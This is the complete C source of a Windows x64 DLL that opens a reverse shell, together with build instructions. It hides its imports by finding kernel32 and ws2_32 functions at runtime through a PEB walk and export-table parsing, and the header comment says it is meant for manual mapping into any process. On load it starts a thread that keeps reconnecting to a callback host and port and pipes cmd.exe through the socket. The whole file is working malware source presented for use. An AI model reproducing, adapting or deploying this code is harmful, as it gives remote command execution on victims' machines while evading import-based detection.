/*
 * revshell.c: Zero-import reverse shell DLL.
 *
 * All Windows APIs are resolved at runtime via PEB walk and export table
 * parsing. The resulting DLL has zero IAT entries and links against no
 * import library. It can be manually mapped into any x64 Windows process
 * that has kernel32.dll loaded (which is every process).
 *
 * Build:
 *   x86_64-w64-mingw32-gcc -nostdlib -shared -Wl,-e,DllMain \
 *       -o revshell.dll revshell.c \
 *       -DCALLBACK_HOST=\"127.0.0.1\" -DCALLBACK_PORT=4444
 */

typedef unsigned char u8;
typedef unsigned short u16;
typedef unsigned int u32;
typedef unsigned long long u64;
typedef unsigned long long usize;
typedef void *ptr;
typedef long long i64;

#ifndef CALLBACK_HOST
#define CALLBACK_HOST "127.0.0.1"
#endif
#ifndef CALLBACK_PORT
#define CALLBACK_PORT 4444
#endif
#ifndef SHELL_BIN
#define SHELL_BIN "cmd.exe"
#endif
#define RECONNECT_DELAY_MS 3000

#define DLL_PROCESS_ATTACH 1
#define AF_INET 2
#define SOCK_STREAM 1
#define INFINITE 0xFFFFFFFF
#define STARTF_USESTDHANDLES 0x100

typedef struct { u32 nLength; ptr lpSecurityDescriptor; int bInheritHandle; } SECURITY_ATTRIBUTES;

__attribute__((used)) void ___chkstk_ms(void) {}

typedef struct { ptr Flink, Blink; } LIST_ENTRY;

typedef struct {
    u16 Length, MaxLength;
    u16 *Buffer;
} UNICODE_STRING;

typedef struct {
    u32 Length;
    u8 Initialized;
    ptr SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
} PEB_LDR_DATA;

typedef struct {
    u8 InheritedAddressSpace, ReadImageFileExecOptions, BeingDebugged, BitField;
    ptr Mutant, ImageBaseAddress;
    PEB_LDR_DATA *Ldr;
} PEB;

typedef struct {
    LIST_ENTRY InLoadOrderLinks, InMemoryOrderLinks, InInitializationOrderLinks;
    ptr DllBase, EntryPoint;
    u32 SizeOfImage;
    UNICODE_STRING FullDllName, BaseDllName;
} LDR_DATA_TABLE_ENTRY;

typedef struct {
    u16 e_magic;
    u16 _pad[28];
    u32 e_lfanew;
} IMAGE_DOS_HEADER;

typedef struct {
    u32 VirtualAddress, Size;
} IMAGE_DATA_DIRECTORY;

typedef struct {
    u16 Machine, NumberOfSections;
    u32 TimeDateStamp, PointerToSymbolTable, NumberOfSymbols;
    u16 SizeOfOptionalHeader, Characteristics;
} IMAGE_FILE_HEADER;

typedef struct {
    u16 Magic;
    u8 MajorLinkerVersion, MinorLinkerVersion;
    u32 SizeOfCode, SizeOfInitializedData, SizeOfUninitializedData;
    u32 AddressOfEntryPoint, BaseOfCode;
    u64 ImageBase;
    u32 SectionAlignment, FileAlignment;
    u16 MajorOperatingSystemVersion, MinorOperatingSystemVersion;
    u16 MajorImageVersion, MinorImageVersion;
    u16 MajorSubsystemVersion, MinorSubsystemVersion;
    u32 Win32VersionValue, SizeOfImage, SizeOfHeaders, CheckSum;
    u16 Subsystem, DllCharacteristics;
    u64 SizeOfStackReserve, SizeOfStackCommit, SizeOfHeapReserve, SizeOfHeapCommit;
    u32 LoaderFlags, NumberOfRvaAndSizes;
    IMAGE_DATA_DIRECTORY DataDirectory[16];
} IMAGE_OPTIONAL_HEADER64;

typedef struct {
    u32 Signature;
    IMAGE_FILE_HEADER FileHeader;
    IMAGE_OPTIONAL_HEADER64 OptionalHeader;
} IMAGE_NT_HEADERS64;

typedef struct {
    u32 Characteristics, TimeDateStamp;
    u16 MajorVersion, MinorVersion;
    u32 Name, Base, NumberOfFunctions, NumberOfNames;
    u32 AddressOfFunctions, AddressOfNames, AddressOfNameOrdinals;
} IMAGE_EXPORT_DIRECTORY;

typedef struct {
    u32 cb;
    ptr lpReserved, lpDesktop, lpTitle;
    u32 dwX, dwY, dwXSize, dwYSize, dwXCountChars, dwYCountChars, dwFillAttribute, dwFlags;
    u16 wShowWindow, cbReserved2;
    ptr lpReserved2;
    u64 hStdInput, hStdOutput, hStdError;
} STARTUPINFOA;

typedef struct {
    u64 hProcess, hThread;
    u32 dwProcessId, dwThreadId;
} PROCESS_INFORMATION;

typedef struct {
    u16 sin_family, sin_port;
    u32 sin_addr;
    u8 sin_zero[8];
} sockaddr_in;

typedef ptr (*fn_LoadLibraryA)(const char *);
typedef u64 (*fn_CreateThread)(ptr, usize, u64(*)(ptr), ptr, u32, u32 *);
typedef void (*fn_Sleep)(u32);
typedef u32 (*fn_WaitForSingleObject)(ptr, u32);
typedef int (*fn_CreateProcessA)(const char *, char *, ptr, ptr, int, u32, ptr, const char *, ptr, ptr);
typedef void (*fn_CloseHandle)(ptr);
typedef int (*fn_WSAStartup)(u16, ptr);
typedef u64 (*fn_socket)(int, int, int);
typedef int (*fn_connect)(u64, ptr, int);
typedef int (*fn_closesocket)(u64);
typedef int (*fn_send)(u64, const char *, int, int);
typedef int (*fn_recv)(u64, char *, int, int);
typedef int (*fn_CreatePipe)(ptr, ptr, ptr, u32);
typedef int (*fn_ReadFile)(ptr, ptr, u32, ptr, ptr);
typedef int (*fn_WriteFile)(ptr, const void *, u32, ptr, ptr);

static PEB *get_peb(void) {
    PEB *peb;
    __asm__ volatile("movq %%gs:0x60, %0" : "=r"(peb));
    return peb;
}

static int streq_ci(const u16 *buf, u16 len_bytes, const char *expected) {
    u16 n = len_bytes / 2;
    for (u16 i = 0; i < n; i++) {
        u16 c = buf[i];
        char e = expected[i];
        if (e == 0) return 0;
        if (c >= L'A' && c <= L'Z') c += 32;
        if (e >= 'A' && e <= 'Z') e += 32;
        if (c != (u16)(u8)e) return 0;
    }
    return expected[n] == 0;
}

static int streq(const char *a, const char *b) {
    while (*a && *b) {
        if (*a != *b) return 0;
        a++; b++;
    }
    return *a == 0 && *b == 0;
}

static ptr find_module(const char *name) {
    PEB *peb = get_peb();
    PEB_LDR_DATA *ldr = peb->Ldr;
    LIST_ENTRY *head = &ldr->InLoadOrderModuleList;
    for (LIST_ENTRY *e = head->Flink; e != head; e = e->Flink) {
        LDR_DATA_TABLE_ENTRY *entry = (LDR_DATA_TABLE_ENTRY *)e;
        if (streq_ci(entry->BaseDllName.Buffer, entry->BaseDllName.Length, name))
            return entry->DllBase;
    }
    return 0;
}

static ptr find_export(ptr dll_base, const char *name) {
    u8 *base = (u8 *)dll_base;
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)base;
    IMAGE_NT_HEADERS64 *nt = (IMAGE_NT_HEADERS64 *)(base + dos->e_lfanew);
    IMAGE_DATA_DIRECTORY *dir = &nt->OptionalHeader.DataDirectory[0];
    if (dir->VirtualAddress == 0) return 0;
    IMAGE_EXPORT_DIRECTORY *exp = (IMAGE_EXPORT_DIRECTORY *)(base + dir->VirtualAddress);
    u32 *names = (u32 *)(base + exp->AddressOfNames);
    u16 *ordinals = (u16 *)(base + exp->AddressOfNameOrdinals);
    u32 *functions = (u32 *)(base + exp->AddressOfFunctions);
    u32 exp_dir_end = dir->VirtualAddress + dir->Size;
    for (u32 i = 0; i < exp->NumberOfNames; i++) {
        const char *fn = (const char *)(base + names[i]);
        if (streq(fn, name)) {
            u32 rva = functions[ordinals[i]];
            if (rva >= dir->VirtualAddress && rva < exp_dir_end) return 0;
            return (ptr)(base + rva);
        }
    }
    return 0;
}

static u16 htons(u16 v) { return (v >> 8) | (v << 8); }

static u32 parse_ipv4(const char *s) {
    u32 parts[4] = {0,0,0,0};
    int idx = 0;
    for (const char *p = s; *p && idx < 4; p++) {
        if (*p >= '0' && *p <= '9')
            parts[idx] = parts[idx] * 10 + (*p - '0');
        else if (*p == '.')
            idx++;
    }
    return parts[0] | (parts[1] << 8) | (parts[2] << 16) | (parts[3] << 24);
}

#define HANDLE_FLAG_INHERIT 0x1

static fn_LoadLibraryA pLoadLibraryA;
static fn_CreateThread pCreateThread;
static fn_Sleep pSleep;
static fn_WaitForSingleObject pWaitForSingleObject;
static fn_CreateProcessA pCreateProcessA;
static fn_CloseHandle pCloseHandle;
static fn_WSAStartup pWSAStartup;
static fn_socket psocket;
static fn_connect pconnect;
static fn_closesocket pclosesocket;
static fn_send psend;
static fn_recv precv;
static fn_CreatePipe pCreatePipe;
static fn_ReadFile pReadFile;
static fn_WriteFile pWriteFile;

static int resolve_apis(void) {
    ptr k32 = find_module("kernel32.dll");
    if (!k32) return 0;
    pLoadLibraryA = (fn_LoadLibraryA)find_export(k32, "LoadLibraryA");
    pCreateThread = (fn_CreateThread)find_export(k32, "CreateThread");
    pSleep = (fn_Sleep)find_export(k32, "Sleep");
    pWaitForSingleObject = (fn_WaitForSingleObject)find_export(k32, "WaitForSingleObject");
    pCreateProcessA = (fn_CreateProcessA)find_export(k32, "CreateProcessA");
    pCloseHandle = (fn_CloseHandle)find_export(k32, "CloseHandle");
    pCreatePipe = (fn_CreatePipe)find_export(k32, "CreatePipe");
    pReadFile = (fn_ReadFile)find_export(k32, "ReadFile");
    pWriteFile = (fn_WriteFile)find_export(k32, "WriteFile");
    if (!pLoadLibraryA || !pCreateThread || !pSleep || !pWaitForSingleObject || !pCreateProcessA
        || !pCloseHandle || !pCreatePipe || !pReadFile || !pWriteFile)
        return 0;
    ptr ws = pLoadLibraryA("ws2_32.dll");
    if (!ws) return 0;
    pWSAStartup = (fn_WSAStartup)find_export(ws, "WSAStartup");
    psocket = (fn_socket)find_export(ws, "socket");
    pconnect = (fn_connect)find_export(ws, "connect");
    pclosesocket = (fn_closesocket)find_export(ws, "closesocket");
    psend = (fn_send)find_export(ws, "send");
    precv = (fn_recv)find_export(ws, "recv");
    if (!pWSAStartup || !psocket || !pconnect || !pclosesocket || !psend || !precv)
        return 0;
    return 1;
}

typedef struct {
    u64 sock;
    ptr write_pipe;
} relay_to_cmd;

typedef struct {
    u64 sock;
    ptr read_pipe;
} relay_from_cmd;

static u64 relay_sock_to_pipe(ptr arg) {
    relay_to_cmd *r = (relay_to_cmd *)arg;
    static char buf[1024];
    for (;;) {
        int n = precv(r->sock, buf, sizeof(buf), 0);
        if (n <= 0) break;
        u32 written = 0;
        if (!pWriteFile(r->write_pipe, buf, (u32)n, &written, 0) || (int)written != n) break;
    }
    pCloseHandle(r->write_pipe);
    return 0;
}

static u64 relay_pipe_to_sock(ptr arg) {
    relay_from_cmd *r = (relay_from_cmd *)arg;
    static char buf[1024];
    for (;;) {
        u32 got = 0;
        if (!pReadFile(r->read_pipe, buf, sizeof(buf), &got, 0) || got == 0) break;
        int sent = psend(r->sock, buf, (int)got, 0);
        if (sent <= 0) break;
    }
    return 0;
}

static u64 revshell_thread(ptr param) {
    (void)param;
    u8 wsa_data[512];
    if (pWSAStartup(0x0202, wsa_data) != 0) return 1;

    for (;;) {
        u64 sock = psocket(AF_INET, SOCK_STREAM, 0);
        if (sock == (u64)-1) { pSleep(RECONNECT_DELAY_MS); continue; }
        sockaddr_in addr = {0};
        addr.sin_family = AF_INET;
        addr.sin_port = htons(CALLBACK_PORT);
        addr.sin_addr = parse_ipv4(CALLBACK_HOST);
        if (pconnect(sock, (ptr)&addr, sizeof(addr)) != 0) {
            pclosesocket(sock);
            pSleep(RECONNECT_DELAY_MS);
            continue;
        }

        ptr child_in_read = 0, child_in_write = 0;
        ptr child_out_read = 0, child_out_write = 0;
        SECURITY_ATTRIBUTES sa = { .nLength = sizeof(sa), .bInheritHandle = 1, .lpSecurityDescriptor = 0 };
        if (!pCreatePipe(&child_in_read, &child_in_write, (ptr)&sa, 0)) {
            pclosesocket(sock);
            pSleep(RECONNECT_DELAY_MS);
            continue;
        }
        if (!pCreatePipe(&child_out_read, &child_out_write, (ptr)&sa, 0)) {
            pCloseHandle(child_in_read);
            pCloseHandle(child_in_write);
            pclosesocket(sock);
            pSleep(RECONNECT_DELAY_MS);
            continue;
        }

        relay_to_cmd to_cmd = { .sock = sock, .write_pipe = child_in_write };
        relay_from_cmd from_cmd = { .sock = sock, .read_pipe = child_out_read };

        u64 t1 = pCreateThread(0, 0, relay_sock_to_pipe, (ptr)&to_cmd, 0, 0);
        u64 t2 = pCreateThread(0, 0, relay_pipe_to_sock, (ptr)&from_cmd, 0, 0);

        char cmd_line[] = "C:\\Windows\\System32\\cmd.exe";
        STARTUPINFOA si = {0};
        PROCESS_INFORMATION pi = {0};
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESTDHANDLES;
        si.hStdInput = (u64)child_in_read;
        si.hStdOutput = (u64)child_out_write;
        si.hStdError = (u64)child_out_write;

        if (pCreateProcessA(0, cmd_line, 0, 0, 1, 0, 0, 0, (ptr)&si, (ptr)&pi)) {
            pCloseHandle(child_in_read);
            pCloseHandle(child_out_write);
            pWaitForSingleObject((ptr)pi.hProcess, INFINITE);
            pCloseHandle((ptr)pi.hProcess);
            pCloseHandle((ptr)pi.hThread);
            pWaitForSingleObject((ptr)t1, 2000);
            pWaitForSingleObject((ptr)t2, 2000);
            pCloseHandle((ptr)t1);
            pCloseHandle((ptr)t2);
        } else {
            pCloseHandle(child_in_read);
            pCloseHandle(child_out_write);
            pCloseHandle((ptr)t1);
            pCloseHandle((ptr)t2);
        }
        pclosesocket(sock);
        pSleep(RECONNECT_DELAY_MS);
    }
    return 0;
}

__declspec(dllexport) u64 revshell_marker(void) {
    return 0xDECA7B0175E11ULL;
}

__declspec(dllexport) ptr revshell_reloc_anchor = (ptr)&revshell_marker;

int DllMain(ptr hinst, u32 reason, ptr reserved) {
    (void)hinst; (void)reserved;
    if (reason != DLL_PROCESS_ATTACH) return 1;
    if (!resolve_apis()) return 0;
    pCreateThread(0, 0, revshell_thread, 0, 0, 0);
    return 1;
}
